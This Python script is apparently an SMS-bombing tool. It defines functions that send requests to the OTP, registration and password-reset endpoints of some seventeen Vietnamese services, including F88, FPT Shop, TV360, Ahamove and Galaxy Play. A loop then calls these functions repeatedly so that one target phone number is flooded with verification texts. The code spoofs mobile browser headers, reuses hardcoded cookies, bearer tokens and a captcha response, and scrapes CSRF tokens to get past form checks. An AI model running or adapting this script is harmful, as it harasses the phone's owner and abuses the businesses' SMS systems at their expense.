import requests
def dplus(phone_number):
    headers = {
    'authority': 'api.dongplus.vn',
    'accept': '*/*',
    'accept-language': 'vi',
    'content-type': 'application/json',
    'cookie': '_ga_RRJDDZGPYG=GS1.1.1695035603.1.0.1695035603.60.0.0; _ga=GA1.1.1278481503.1695035603',
    'origin': 'https://dongplus.vn',
    'referer': 'https://dongplus.vn/user/login',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
}
    json_data = {
    'phone': phone_number,
}
    response = requests.post(
    'https://api.dongplus.vn/api/user/send-one-time-password',headers=headers,json=json_data)
def f88(phone_number):
    headers = {
        'Host': 'api.f88.vn',
        'accept': 'application/json, text/plain, */*',
        'content-encoding': 'gzip',
        'user-agent': 'Mozilla/5.0 (Linux; Android 12; Pixel 3 Build/SP1A.210812.016.C1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.136 Mobile Safari/537.36',
        'content-type': 'application/json',
        'origin': 'https://online.f88.vn',
        'referer': 'https://online.f88.vn/',
    }
    data = {
        'phoneNumber': phone_number,
        'recaptchaResponse': '03AFY_a8WJNsx5MK3zLtXhUWB0Jlnw7pcWRzw8R3OhpEx5hu3Shb7ZMIfYg0H2X24378jj2NFtndyzGFF_xjjZ6bbq3obns9JlajYsIz3c1SESCbo05CtzmP_qgawAgOh495zOgNV2LKr0ivV_tnRpikGKZoMlcR5_3bks0HJ4X_R6KgdcpYYFG8cUZRSxSamyRPkC2yjoFNpTeCJ2Q6-0uDTSEBjYU5T3kj8oM8rAAR6BnBVVD7GMz0Ol2OjsmmXO4PtOwR8yipYdwBnL2p8rC8cwbPJ-Q6P1mTmzHkxZwZWcKovlpEGUvt2LfByYwXDMmx7aoI6QMTitY64dDVDdQSWQfyXC1jFg200o5TBFnTY0_0Yik31Y33zCM_r24HQ56KRMuew2LazF8u_30vyWN1tigdvPddOOPjWGjh2cl87l2cF57lCvoRTtOm-RRxyy5l0eq4dgsu2oy1khwawzzP5aE9c2rgcdDVMojZOUpamqhbKtsExad31Brilwf7BSVvu-JT33HtHO',
        'source': 'Online'
    }
    try:
        response = requests.post('https://api.f88.vn/growth/appvay/api/onlinelending/VerifyOTP/sendOTP', json=data, headers=headers)
    except:
        pass
def fpt(phone_number):
    cookies = {
    '_ga': 'GA1.3.1920025656.1686990031',
    'log_6dd5cf4a-73f7-4a79-b6d6-b686d28583fc': '52680236-63e6-44ea-85c7-2ae8b870397e',
    '_gid': 'GA1.3.1550600958.1687262331',
    '_gat': '1',
    'vMobile': '1',
    '__zi': '2000.SSZzejyD7iu_cVEzsr0LpYAPvhoKKa7GR9V-_iX0Iyv-rUpetayLndwReEhRIH37TfVfwjH8MiTpc-hfq4jSpG.1',
    '__cf_bm': 'RVEEK937c_RiRJhEGx3wkp7ig_FF8mn.7C86PgJiB0c-1687262335-0-Ae+YlUD9RzEt60k728PpN5piSAND0YJfzQ9eLXgJabSG+I8hhyBQFAwKqX0RtgOWOw==',
}
    headers = {
    'Accept': '*/*',
    'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'Cookie': '_ga=GA1.3.1920025656.1686990031; log_6dd5cf4a-73f7-4a79-b6d6-b686d28583fc=52680236-63e6-44ea-85c7-2ae8b870397e; _gid=GA1.3.1550600958.1687262331; _gat=1; vMobile=1; __zi=2000.SSZzejyD7iu_cVEzsr0LpYAPvhoKKa7GR9V-_iX0Iyv-rUpetayLndwReEhRIH37TfVfwjH8MiTpc-hfq4jSpG.1; __cf_bm=RVEEK937c_RiRJhEGx3wkp7ig_FF8mn.7C86PgJiB0c-1687262335-0-Ae+YlUD9RzEt60k728PpN5piSAND0YJfzQ9eLXgJabSG+I8hhyBQFAwKqX0RtgOWOw==',
    'Origin': 'https://fptshop.com.vn',
    'Referer': 'https://fptshop.com.vn/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
}
    data = {
    'phone': phone_number,
}
    response = requests.post('https://fptshop.com.vn/api-data/loyalty/Login/Verification', cookies=cookies, headers=headers, data=data)
def tv360(phone_number):
    cookies = {
    'acw_tc': '6c2ff1c4047289eac933092777c9974a3c6cf0dd183ff5da09edd88376f73c15',
    'img-ext': 'avif',
    'device-id': 's%3Awap_2309dbc6-0f36-4df7-b3d2-7ae8f6b6107c.gGjin700RXZjZb3DQs0auVlGiV4iAceuDGKrhREaatY',
    'shared-device-id': 'wap_2309dbc6-0f36-4df7-b3d2-7ae8f6b6107c',
    'screen-size': 's%3A385x854.YsJCQUjKOJSkUOYLfVhMNjngvj0EBsElrxhbkBkUaj0',
    'G_ENABLED_IDPS': 'google',
    'session-id': 's%3A57d74d42-70ba-4518-9a73-8b5311759288.uylCj1QFrKq42jJ9TcI32wDwMFzpi1YZsxgyHq9PqJM',
    'access-token': '',
    'refresh-token': '',
    'msisdn': '',
    'profile': '',
    'user-id': '',
    'auto-login': 's%3A1.E8d5%2BqHvtoRa81DxWMn1MgOyHoaIIEARCHxdA33Dyqw',
} 
    headers = {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json',

    'Origin': 'http://m.tv360.vn',
    'Referer': 'http://m.tv360.vn/login?r=http%3A%2F%2Fm.tv360.vn%2F',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
}
    json_data = {
    'msisdn': phone_number,
}
    response = requests.post(
    'http://m.tv360.vn/public/v1/auth/get-otp-login',
    cookies=cookies,
    headers=headers,
    json=json_data,
    verify=False,
)
def kingf(phone_number):
    headers = {
    'authority': 'api.onelife.vn',
    'accept': '*/*',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'authorization': '',
    'content-type': 'application/json',
    'origin': 'https://kingfoodmart.com',
    'referer': 'https://kingfoodmart.com/',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
}
    json_data = {
    'operationName': 'SendOTP',
    'variables': {
        'phone': phone_number,
    },
    'query': 'mutation SendOTP($phone: String!) {\n  sendOtp(input: {phone: $phone, captchaSignature: "", email: ""}) {\n    otpTrackingId\n    __typename\n  }\n}',
}
    response = requests.post('https://api.onelife.vn/v1/gateway/', headers=headers, json=json_data)
def onc(phone_number):
    cookies = {
    'OnCredit_id': '6505ae4998db95.05666306',
    'fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef': '835xziBdaOZueQJS5GCUrEKMNEoUhbxULTv5JgfeG9A=',
    'SN5c8116d5e6183': 'au5rv15099gcmpah7p25bl6cmv',
}
    headers = {
    'authority': 'oncredit.vn',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7',
    'cache-control': 'max-age=0',
    # 'cookie': 'OnCredit_id=6505ae4998db95.05666306; fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef=835xziBdaOZueQJS5GCUrEKMNEoUhbxULTv5JgfeG9A=; SN5c8116d5e6183=au5rv15099gcmpah7p25bl6cmv',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
}
    response = requests.get('https://oncredit.vn/registration', cookies=cookies, headers=headers).text
    name=response.split('name="CSRFName" value="')[1].split('" />')[0]
    token=response.split('name="CSRFToken" value="')[1].split('" />')[0]
    cookies = {
    'OnCredit_id': '6505ae4998db95.05666306',
    'fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef': '835xziBdaOZueQJS5GCUrEKMNEoUhbxULTv5JgfeG9A=',
    'SN5c8116d5e6183': 'au5rv15099gcmpah7p25bl6cmv',
}
    headers = {
    'authority': 'oncredit.vn',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'OnCredit_id=6505ae4998db95.05666306; fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef=835xziBdaOZueQJS5GCUrEKMNEoUhbxULTv5JgfeG9A=; SN5c8116d5e6183=au5rv15099gcmpah7p25bl6cmv',
    'origin': 'https://oncredit.vn',
    'referer': 'https://oncredit.vn/registration',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}
    data = {
    'data[typeData]': 'sendCodeReg',
    'data[phone]': phone_number,
    'data[email]': '',
    'data[captcha1]': '1',
    'data[lang]': 'vi',
    'CSRFName': name,
    'CSRFToken':token,
}
    response = requests.post('https://oncredit.vn/?ajax', cookies=cookies, headers=headers, data=data)
def pzc(phone_number):
    cookies = {
    '.Nop.Antiforgery': 'CfDJ8Mw2wCVl0flNoCusKiz1Kh9LW-LYOBR1RUjQoroHgERIMT3CyYbfXPJwX-ETjjjm3Ks2N5wrAjYYTrJ_eSNW127QUapKlEUQ9XwNHWl7Tp9y3o-xWIGF69Wo31XVthr-jnEK9gdGbCgECNm3f98F8dY',
    '.Nop.Customer': '8c6fd72e-d89e-4653-a39b-8fbb29c3c066',
    '.Nop.TempData': 'CfDJ8Mw2wCVl0flNoCusKiz1Kh_i4ZyBKY1gByuyNgbU04tZJ7WI0YjlY40bZJB-8fn38vdCSaPygXlhP-t7ZNX5VLwE80AKkvI4APYwCNNCxo9912fjokYz7zNtEgkA-Wwryvbn-rp8bfCuqvKv6ATiM9gNB0oXIS6zMqSxD6sQDTYltpFwzFumqfDnEFJCNuB1gQ',
}
    headers = {
    'authority': 'thepizzacompany.vn',
    'accept': '*/*',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://thepizzacompany.vn',
    'referer': 'https://thepizzacompany.vn/Otp',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}
    data = {
    'phone': phone_number,
    '__RequestVerificationToken': 'CfDJ8Mw2wCVl0flNoCusKiz1Kh_0bsZfJHVyPWNRFQgq0Zy1-xX202bqxs9uSNPWL9aHR-fGQ48Zi_IuqEBa3Us3OesOFem42BwyBH6YY8FRi2MCf6XfXXSa9gksdvOQiWrCDjUE_wgJEfH-e62Uxadk1-A',
}
    pzc = requests.post('https://thepizzacompany.vn/customer/ResendOtp', cookies=cookies, headers=headers, data=data)
def pl(phone_number):
    headers = {
    'authority': 'api-crownx.winmart.vn',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7',
    'authorization': 'Bearer undefined',
    'content-type': 'application/json',
    'origin': 'https://order.phuclong.com.vn',
    'referer': 'https://order.phuclong.com.vn/',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
}
    json_data = {
    'userName': phone_number,
}
    response = requests.post('https://api-crownx.winmart.vn/as/api/plg/v1/user/forgot-pwd', headers=headers, json=json_data)
def em(phone_number):
    cookies = {
    'language': 'vietn',
    'currency': 'VND',
    'emartsess': '5sk1nf5u2dijaih2p9vm5a2lf4',
    'default': '6c65f6c1437383b0fd9b9a4830',
    'emartCookie': 'Y',
}
    headers = {
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'Cookie': 'language=vietn; currency=VND; emartsess=5sk1nf5u2dijaih2p9vm5a2lf4; default=6c65f6c1437383b0fd9b9a4830; emartCookie=Y',
    'Origin': 'https://emartmall.com.vn',
    'Referer': 'https://emartmall.com.vn/index.php?route=account/register',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
}
    data = {
    'mobile': phone_number,
}
    em = requests.post('https://emartmall.com.vn/index.php?route=account/register/smsRegister',cookies=cookies,headers=headers,data=data,)
def aha(phone_number):
    headers = {
    'authority': 'api.ahamove.com',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7',
    'content-type': 'application/json;charset=UTF-8',
    'origin': 'https://app.ahamove.com',
    'referer': 'https://app.ahamove.com/',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
}
    json_data = {
    'mobile': phone_number,
    'country_code': 'VN',
    'firebase_sms_auth': True,
}
    response = requests.post('https://api.ahamove.com/api/v3/public/user/login', headers=headers, json=json_data)
def hn(phone_number):
    headers = {
    'authority': 'api.hanagold.vn',
    'accept': 'application/json',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'content-type': 'application/json',
    'origin': 'https://hanagold.vn',
    'referer': 'https://hanagold.vn/',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'token': 'null',
    'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
}
    json_data = {
    'email': '',
    'mobile': phone_number,
    'fullname': 'Nguyen Van A',
    'password': '14p22008',
}
    hn = requests.post('https://api.hanagold.vn/app/auth/register', headers=headers, json=json_data)
def glx(phone_number):
      headers = {
    'authority': 'api.glxplay.io',
    'accept': '*/*',
    'accept-language': 'vi',
    'access-token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzaWQiOiJhMWQzZWI4Yi0yMTQyLTRjY2ItYTc0Zi04MzYzZmUxMTFhNjIiLCJkaWQiOiI2YWZhMWI1Yy0wNDNkLTQ2M2EtOTEwNi1lNTA2NTRjNTY5ODciLCJpcCI6IjEuNTUuOTYuMTIzIiwibWlkIjoiTm9uZSIsInBsdCI6IndlYnxtb2JpbGV8YW5kcm9pZHwxMHxjaHJvbWUiLCJhcHBfdmVyc2lvbiI6IjIuMC4wIiwiaWF0IjoxNjk3Mjg4MTUzLCJleHAiOjE3MTI4NDAxNTN9.imWOYRJ0uFf2TvX5ZZDuBxUk0AgjyYwu2kwziVSGlNE',
    # 'content-length': '0',
    'origin': 'https://galaxyplay.vn',
    'referer': 'https://galaxyplay.vn/',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}
      params = {
    'phone': phone_number,
}
      response = requests.post('https://api.glxplay.io/account/phone/verify', params=params, headers=headers)
def vay(phone_number):
    cookies = {
    '_ym_uid': '1687323580684672732',
    '_ym_d': '1687323580',
    '_ym_isad': '2',
    '_ym_visorc': 'b',
}
    headers = {
    'authority': 'api.vayvnd.vn',
    'accept': 'application/json',
    'accept-language': 'vi-VN',
    'content-type': 'application/json; charset=utf-8',
    'origin': 'https://vayvnd.vn',
    'referer': 'https://vayvnd.vn/',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'site-id': '3',
    'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
}
    json_data = {
    'login': phone_number,
}
    response = requests.post('https://api.vayvnd.vn/v2/users/password-reset', cookies=cookies, headers=headers, json=json_data)
def ubo(phone_number):
    headers = {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7',
    'Authorization': 'Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MjkxMzk1MzEsInJvbGVfY29kZSI6ImN1c3RvbWVyIiwidHJhZGVfY29kZSI6IjEwMTAxOTAwMCJ9.eso0bGJdqAUjaHET0iEXUm7I83kwoyNe22_2JjjLbT8AHDZhTf_RNvj0OuxR6AeYJb39_8uI-2ytJaH48oX1mYQUyJjXG-pl4RhA2h0Q6n9znHSVVIrfSR8eSsXoKuEbOnF9VbceXoOMPGTmZ_C5DhwAEmbQNdRcbYRPuIQT6M8tXGVsKfjKU-f80wAPDXwwnKlQsmd2SllLL7dmjzg5lF6MGLzihd6Rm4g5r49qUVsRQPYt1Os7ysIM2eC7cXMDTaXNXs8SBcdcPK2xreN7oOAXhvuyHCMq1RkDKy37owtDUJJLChQIeaTb57y_ecIajQJ0zMKkejoJ7ZQftLi6P54MUT0MUNHOipOvNBgeureOQZ-LljM9MWBIMqb7_kqH3U_J-DYdlTNcDiw8_oV5WufnD4AWdWkttw9rggek8FmvDd0nrYJAdgV8_xDMJmmXeapwuTwoIrR5WZTS7GzZ_wrpthD5nPbrRfdIIOSc0LtMPd4WQore-T-iM65IL8QzUbavp4hlZPJJmGDA_q2MBLRoJOAnbBw4qVw7YxUIfQRfWdBIXlbcxfGydEM2NgqF7Vu7BM8BwQNDXhKZJoKlPcbImlFDOyqmCxpdWIcUgcl5xDLzjefHYEdxQDpPPB7Ro02mz8JxAqAL4RMHsQKJtmRUK7B0eFYkvZkpZjSM-8o',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'Cookie': 'ubo_trade=%7B%22code%22%3A%22101019000%22%2C%22name%22%3A%22H%C3%A0%20N%E1%BB%99i%22%2C%22email%22%3A%22info%40ubofood.com%22%2C%22phone_number%22%3A%220344350998%22%2C%22address%22%3A%7B%22area%22%3A%7B%22code%22%3A%221%22%2C%22name%22%3A%22Mi%E1%BB%81n%20B%E1%BA%AFc%22%7D%2C%22city%22%3A%7B%22code%22%3A%2201%22%2C%22name%22%3A%22Th%C3%A0nh%20ph%E1%BB%91%20H%C3%A0%20N%E1%BB%99i%22%7D%2C%22district%22%3A%7B%22code%22%3A%22019%22%2C%22name%22%3A%22Qu%E1%BA%ADn%20Nam%20T%E1%BB%AB%20Li%C3%AAm%22%7D%2C%22ward%22%3A%7B%22code%22%3A%2200637%22%2C%22name%22%3A%22Ph%C6%B0%E1%BB%9Dng%20Trung%20V%C4%83n%22%7D%2C%22text%22%3A%22CT1A%22%2C%22building%22%3A%22%22%2C%22floor%22%3A%22%22%2C%22apartment_no%22%3A%22%22%7D%2C%22discount%22%3A0%2C%22coordinate%22%3A%7B%22lat%22%3A20.995577269420178%2C%22lng%22%3A105.77924502563441%7D%2C%22status%22%3Atrue%2C%22created_at%22%3A%222022-07-05T15%3A16%3A56.5Z%22%2C%22updated_at%22%3A%222023-02-21T06%3A51%3A36.733Z%22%2C%22updated_by%22%3A%22admin%22%2C%22default_pos_code%22%3A%2200616002%22%7D; ubo_token=Bearer%20eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MjkxMzk1MzEsInJvbGVfY29kZSI6ImN1c3RvbWVyIiwidHJhZGVfY29kZSI6IjEwMTAxOTAwMCJ9.eso0bGJdqAUjaHET0iEXUm7I83kwoyNe22_2JjjLbT8AHDZhTf_RNvj0OuxR6AeYJb39_8uI-2ytJaH48oX1mYQUyJjXG-pl4RhA2h0Q6n9znHSVVIrfSR8eSsXoKuEbOnF9VbceXoOMPGTmZ_C5DhwAEmbQNdRcbYRPuIQT6M8tXGVsKfjKU-f80wAPDXwwnKlQsmd2SllLL7dmjzg5lF6MGLzihd6Rm4g5r49qUVsRQPYt1Os7ysIM2eC7cXMDTaXNXs8SBcdcPK2xreN7oOAXhvuyHCMq1RkDKy37owtDUJJLChQIeaTb57y_ecIajQJ0zMKkejoJ7ZQftLi6P54MUT0MUNHOipOvNBgeureOQZ-LljM9MWBIMqb7_kqH3U_J-DYdlTNcDiw8_oV5WufnD4AWdWkttw9rggek8FmvDd0nrYJAdgV8_xDMJmmXeapwuTwoIrR5WZTS7GzZ_wrpthD5nPbrRfdIIOSc0LtMPd4WQore-T-iM65IL8QzUbavp4hlZPJJmGDA_q2MBLRoJOAnbBw4qVw7YxUIfQRfWdBIXlbcxfGydEM2NgqF7Vu7BM8BwQNDXhKZJoKlPcbImlFDOyqmCxpdWIcUgcl5xDLzjefHYEdxQDpPPB7Ro02mz8JxAqAL4RMHsQKJtmRUK7B0eFYkvZkpZjSM-8o',
    'Origin': 'https://ubofood.com',
    'Referer': 'https://ubofood.com/register',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
}
    data = f'{{"phone_number":"{phone_number}","trade_code":"101019000"}}'
    response = requests.post('https://ubofood.com/api/v1/account/customers/register', headers=headers, data=data)
def best(phone_number):
      headers = {
    'Accept-Language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7',
    'Connection': 'keep-alive',
    'Origin': 'https://best-inc.vn',
    'Referer': 'https://best-inc.vn/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'cross-site',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'accept': 'application/json',
    'authorization': 'null',
    'content-type': 'application/json',
    'lang-type': 'vi-VN',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'x-auth-type': 'web-app',
    'x-lan': 'VI',
    'x-nat': 'vi-VN',
    'x-timezone-offset': '7',
}
      json_data = {
    'phoneNumber': phone_number,
    'verificationCodeType': 1,
}
      response = requests.post('https://v9-cc.800best.com/uc/account/sendsignupcode', headers=headers, json=json_data)
def sms(phone_number,time):
  for i in range(0,time):
    dplus(phone_number)
    f88(phone_number)
    fpt(phone_number)
    dplus(phone_number)
    tv360(phone_number)
    kingf(phone_number)
    best(phone_number)
    onc(phone_number)
    pzc(phone_number)
    pl(phone_number)
    onc(phone_number)
    em(phone_number)
    aha(phone_number)
    dplus(phone_number)
    hn(phone_number)
    glx(phone_number)
    onc(phone_number)
    vay(phone_number)
    ubo(phone_number)
    dplus(phone_number)
